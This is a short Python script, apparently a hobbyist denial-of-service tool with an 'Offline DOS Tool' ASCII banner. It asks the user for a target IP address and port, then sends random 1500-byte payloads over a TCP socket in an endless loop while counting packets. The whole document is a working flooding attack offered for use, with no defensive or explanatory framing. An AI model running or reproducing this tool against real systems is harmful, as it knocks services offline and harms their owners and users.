#!/usr/bin/python3
import sys
import socket
import random
from time import sleep


print("""\

  /$$$$$$   /$$$$$$   /$$$$$$  /$$ /$$                           /$$$$$$$   /$$$$$$   /$$$$$$        /$$$$$$$$                  /$$
 /$$__  $$ /$$__  $$ /$$__  $$| $$|__/                          | $$__  $$ /$$__  $$ /$$__  $$      |__  $$__/                 | $$
| $$  \ $$| $$  \__/| $$  \__/| $$ /$$ /$$$$$$$   /$$$$$$       | $$  \ $$| $$  \ $$| $$  \__/         | $$  /$$$$$$   /$$$$$$ | $$
| $$  | $$| $$$$    | $$$$    | $$| $$| $$__  $$ /$$__  $$      | $$  | $$| $$  | $$|  $$$$$$          | $$ /$$__  $$ /$$__  $$| $$
| $$  | $$| $$_/    | $$_/    | $$| $$| $$  \ $$| $$$$$$$$      | $$  | $$| $$  | $$ \____  $$         | $$| $$  \ $$| $$  \ $$| $$
| $$  | $$| $$      | $$      | $$| $$| $$  | $$| $$_____/      | $$  | $$| $$  | $$ /$$  \ $$         | $$| $$  | $$| $$  | $$| $$
|  $$$$$$/| $$      | $$      | $$| $$| $$  | $$|  $$$$$$$      | $$$$$$$/|  $$$$$$/|  $$$$$$/         | $$|  $$$$$$/|  $$$$$$/| $$
 \______/ |__/      |__/      |__/|__/|__/  |__/ \_______/      |_______/  \______/  \______/          |__/ \______/  \______/ |__/                                                                                                                                                     

                    """)

sleep(5)
try:
    soc=socket.socket()
    byte=random._urandom(1500)
    ip=input("What is the target IP?" + "\n")
    port=input("What is the target Port?" + "\n")
    soc.connect((str(ip),int(port)))
    sent=0
    while True:
        try:
            sent+=1
            soc.sendto(byte,(str(ip),int(port)))
            print("\x1b[31m[%d]\x1b[0m packets sended to \x1b[32m[%s:%s]\x1b[0m through port \x1b[32m[%s]\x1b[0m"%(sent,ip,port,soc.getsockname()[1]))
        except KeyboardInterrupt:
            soc.close()
            break
        except BrokenPipeError :
            soc.close()
            break
        except ConnectionResetError :
            soc.close()
            break
        except ConnectionRefusedError :
            soc.close()
            break
except ConnectionRefusedError :
    soc.close()
print("session ended due to unexpected interrupt :-(")
input("")
        